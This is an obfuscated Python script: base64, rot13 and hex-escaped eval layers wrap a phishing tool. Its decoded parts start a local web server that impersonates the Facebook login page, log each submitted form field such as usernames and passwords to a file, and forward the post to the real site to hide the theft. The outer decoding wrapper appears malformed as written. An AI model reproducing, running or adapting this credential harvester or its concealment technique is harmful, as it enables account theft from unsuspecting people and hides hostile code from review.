
import base64
subextractor = """import base64, codecs
magic = 'aW1wb3J0IHVybGxpYi5yZXF1ZXN0IGFzIHVsaWIKZnJvbSBvcyBpbXBvcnQgc3lzdGVtCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgb3MKaW1wb3J0IGNnaQppbXBvcnQgcmUKZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgYnMKaW1wb3J0IGh0dHAuc2VydmVyCmZyb20gc3VicHJvY2VzcyBpbXBvcnQgY2hlY2tfb3V0cHV0CgpSRUQsIFdISVRFLCBDWUFOLCBHUkVFTiwgREVGQVVMVCwgQ1lBTkNMQVJPID0gJ1wwMzNbOTFtJywgJ1wwMzNbNDZtJywgJ1wwMzNbMzZtJywgJ1wwMzNbMTszMm0nLCAgJ1wwMzNbMG0nLCAnXDAzM1sxOzM2bScKCmRlZiBtYWluKCk6CglwcmludCAoIiIiCns1fVwwMzNbNDRtCuKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilZcgIOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVlyAg4paI4paI4pWX4paI4paI4pWX4paI4paI4paI4pWXICAg4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICDilojilojilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZcg4paI4paI4pWXICAgIArilojilojilZTilZDilZDilojilojilZfilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWR4paI4paI4paI4paI4pWXICDilojilojilZHilojilojilZTilZDilZDilZDilZDilZ0gICAg4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAgICAK4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWR4paI4paI4pWU4paI4paI4pWXIOKWiOKWiOKVkeKWiOKWiOKVkSAg4paI4paI4paI4pWX4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWRICAgICAK4paI4paI4pWU4pWQ4pWQ4pWQ4pWdIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkeKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKVl+KWiOKWiOKVkeKWiOKWiOKVkSAgIOKWiOKWiOKVkeKVmuKVkOKVkOKVkOKVkOKVneKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkSAgICAgCuKWiOKWiOKVkSAgICAg4paI4paI4pWRICDilojilojilZHilojilojilZHilojilojilojilojilojilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVkSDilZrilojilojilojilojilZHilZrilojilojilojilojilojilojilZTilZ0gICAgICDilojilojilZEgICDilZrilojilojilojilojilojilojilZTilZ3ilZrilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilojilZcK4pWa4pWQ4pWdICAgICDilZrilZDilZ0gIOKVmuKVkOKVneKVmuKV'
love = 'xBXIarXIzhXIxBXIxBXIxBXIxBXIxBXIxBXIarXIzhXIxBXIaFNt4cJn4cJD4cJq4cJn4cJD4cJq4cJn4cJD4cJqVPQvyMevyMQvyMQvyMQvyM0t4cJn4cJD4cJD4cJD4cJD4cJD4cJqVPNtVPNtVBXIzhXIxBXIaFNtVPQvyMevyMQvyMQvyMQvyMQvyMQvyM0tVBXIzhXIxBXIxBXIxBXIxBXIxBXIaFQvyMevyMQvyMQvyMQvyMQvyMQvyMQvyM17ZK0XKQNmZ1f0AT0tVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPO7AK0tVPNtVPNtVPNtVSjjZmAoAQEgVRShM2IfH2IwqKWcqUyHMJSgKQNmZ1f0AT0vVvVhMz9loJS0XRAMDH4fVRESExSIGSDfVRqFEHIBYPOFEHDfVRAMDH5QGRSFGlkUHxISGvxcPtbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNbWq2ucoTHtIUW1MGbXPDybMJkjXPxXPDy0pax6PtxWPDbWPDywo21gCJyhpUI0XPWpZQZmJmD0oKfjsIObnKAbnJ5aIT9ioUfksFN+CvO7Za1pZQZmJmD0oFVhMz9loJS0XRAMDH4fVSWSEPjtERITDIIZIPxcYaAjoTy0XPxXPDxWPtxWPtxWPJyzVT5iqPOwo21gBtbWPDxWpUWcoaDbMJ5xCFpaXDbXPDxWMJkcMvOwo21gJmOqCG0vMJEcqPV6PtxWPDycMvuwo21gJmSqCG0vqKWfVvx6PtxWPDxWM2kiLzSfVUIloNbWPDxWPKIloQ1wo21gJmWqPtxWPDxWPtxWPDxXPDxWPJyzXTAioJ1oZI09CFWjo3W0Vvx6PtxWPDxWM2kiLzSfVUOipaDXPDxWPDyjo3W0CJyhqPuwo21gJmWqXDbtVPNtVPNtVPNtVPNtVPNtVPNtPtbWPDxWnJLbL29goIfkKG09VaIloS9xMKA0nJ5uqTyiovVcBtbWPDxWPJqfo2WuoPO1pzksMTImqTyhLKEco24XPDxWPDy1pzksMTImqTyhLKEco249L29goIflKDbWPDxWPDbXPDxWPJyzXTAioJ1oZI09CFW1p2IlK2SaMJ50Vvx6PtxWPDxWM2kiLzSfVUImMKWsLJqyoaDXPDxWPDycMvufMJ4bL29goFx9CGZcBtbWPDxWPDy1p2IlK2SaMJ50CJAioJ1oZy0XPDxWPDyyoUAyBtbWPDxWPDy1p2IlK2SaMJ50CJyhpUI0XPWIp2IlK0SaMJ50VQbtVvxXPDxWPDxXPDxXPDxWMJkcMvOwo21gJmOqCG0vp3EupaDvBtbWPDxWqm1lMKMioUEmnTyhMlttqKWfYPOjo3W0XDbWPDxWql5woT9hLKVbXDbWPDxWql5mMKW2nJEipvtcPtbWPDyyoTyzVTAioJ1oZS09CFWyrTy0VwbXPDxWPJ9mYaA5p3EyoFtvMaImMKVtYJftYJ4tqTAjVQtjBQNtVvxXPDxWPJI4nKDbXDbXPDxWMJkmMGbXPDxWPKOlnJ50XPxXPtxWMKuwMKO0VRgyrJWiLKWxFJ50MKWlqKO0BtbWPDyipl5mrKA0MJ0bVzM1p2IlVP1eVP1hVUEwpPN4ZQtjVvxXPDxWqm1lMKMioUEmnTyhMlttqKWfYPOjo3W0XDbWPDy3YzIfnJ1cozSlXPxWPDxXPDxWpUWcoaDbXDbXMTIzVTuyoUNbXGbXPDbWpUWcoaDbVyjjZmAoAQEgVvxXPKOlnJ50XPWpqSjjZmAoAQEgVUflsKfjsIg7Za0drmO9KKfjsFOyMTy0VPNtVPO7Za0tVPN6VRIxnKDtrmW9VSg7ZU11pzjfpT9lqPk1pzksMTImqTyhLKEco24fqKAypy9uM2IhqUflsI17ZU0vYzMipz1uqPuQJHSBYPOREHMOIHkHYPOUHxISGvjtHxIRXFxXPKOlnJ50XPWpqSjjZmAoAQEgVUfjsIg7Za0drmO9KKfjsFOmqTSlqPNt'
god = 'ICB7Mn0gICA6IFN0YXJ0IFNlcnZlciIuZm9ybWF0KENZQU4sIERFRkFVTFQsIEdSRUVOLCBSRUQpKQoJcHJpbnQoIlx0XDAzM1s0NG0gezB9W3syfSp7MH1dezB9IGV4aXQgICAgICAgezJ9IDogZXhpdCIuZm9ybWF0KENZQU4sIERFRkFVTFQsIEdSRUVOLCBSRUQpKQoJcHJpbnQoIlx0XDAzM1s0NG0gezB9W3syfSp7MH1dezB9IHBvcnQgICAgICAgezJ9IDoiLmZvcm1hdChDWUFOLCBERUZBVUxULCBHUkVFTiwgUkVEKSxwb3J0ICkKCXByaW50KCJcdFwwMzNbNDRtIHswfVt7Mn0qezB9XXswfSB1cmwgICAgICAgIHsyfSA6Ii5mb3JtYXQoQ1lBTiwgREVGQVVMVCwgR1JFRU4sIFJFRCksdXJsICkKCXByaW50KCJcdFwwMzNbNDRtIHswfVt7Mn0qezB9XXswfSB1cmxfZGVzdGluYXRpb257Mn0gOiIuZm9ybWF0KENZQU4sIERFRkFVTFQsIEdSRUVOLCBSRUQpLHVybF9kZXN0aW5hdGlvbikKCXByaW50KCJcdFwwMzNbNDRtIHswfVt7Mn0qezB9XXswfSB1c2VyX2FnZW50IHsyfSA6Ii5mb3JtYXQoQ1lBTiwgREVGQVVMVCwgR1JFRU4sIFJFRCksdXNlcl9hZ2VudCkKCXByaW50KCkKCQpwb3J0PWludCg4MDgwKQp1cmw9Imh0dHBzOi8vZXMtZXMuZmFjZWJvb2suY29tIgp1cmxfZGVzdGluYXRpb249Imh0dHBzOi8vZXMtZXMuZmFjZWJvb2suY29tIgp1c2VyX2FnZW50PSJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCBpNjg2OyBydjo2NC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzY0LjAiCgpjbGFzcyBoYW5kbGVyKGh0dHAuc2VydmVyLlNpbXBsZUhUVFBSZXF1ZXN0SGFuZGxlcik6CglkZWYgZG9fUE9TVChzZWxmKToKCQlwb3N0X3JlcXVlc3QgPSBbXQoJCXByaW50KCJcdCIrc2VsZi5hZGRyZXNzX3N0cmluZygpLCJzZW50IFBPU1QgcmVxIikKCQlmb3JtID0gY2dpLkZpZWxkU3RvcmFnZShzZWxmLnJmaWxlLGhlYWRlcnM9c2VsZi5oZWFkZXJzLAoJCSAgICBlbnZpcm9uPXsnUkVRVUVTVF9NRVRIT0QnOidQT1NUJywKCQkJICAgICAnQ09OVEVOVF9UWVBFJzpzZWxmLmhlYWRlcnNbJ0NvbnRlbnQtVHlwZSddLH0pCgoJCWxvZz1vcGVuKHVybC5zcGxpdCgiLy8iKVsxXSsiLmxvZyIsImErIikKCQlsb2cud3JpdGUoIi4uLi4uLi4iKQoJCWxvZy53cml0ZSgiUGFxdWV0ZSAiK3VybCsiXG4iKQoKCQlmb3IgdGFnIGluIGZvcm0ubGlzdDoKCQkJdG1wID0gc3RyKHRhZykuc3BsaXQoIigiKVsxXQoJCQlrZXksdmFsdWUgPSB0bXAucmVwbGFjZSgiKSIsICIiKS5yZXBsYWNlKCJcJyIsICIiKS5yZXBsYWNlKCIsIiwgIiIpLnNwbGl0KCkKCQkJcG9zdF9yZXF1ZXN0LmFwcGVuZCgoa2V5LHZhbHVlKSkKCQkJcHJpbnQoIlx0IitrZXkrIiA9ICIrdmFsdWUpCgkJCWxvZy53cml0ZShrZXkrIj0iK3ZhbHVlKyJcbiIpCgkJCgkJbG9nLmNsb3NlKCk7CgkJY3JlYXRlX3Bvc3QodXJsLHVybF9kZXN0aW5hdGlvbixwb3N0X3JlcXVlc3QpCgkJaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyLmRvX0dFVChzZWxmKQoJCQoKZGVmIGNyZWF0ZV9wb3N0KHVybCx1cmxfZGVzdGluYXRpb24scG9zdF9yZXF1ZXN0KToKCglyZWYgPSBvcGVuKCJyZWYuaHRtbCIsInciKQoJcmVmLndyaXRlKCI8Ym9keT48Zm9ybSBpZD1cImZmXCIgYWN0aW9uPVwiIit1cmxfZGVzdGluYXRpb24rIlwiIG1ldGhvZD1cInBvc3RcIiA+XG4iKQoJCglmb3Ig'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))"""
eval(compile(base64.b64decode(subextractor),'','exec'))
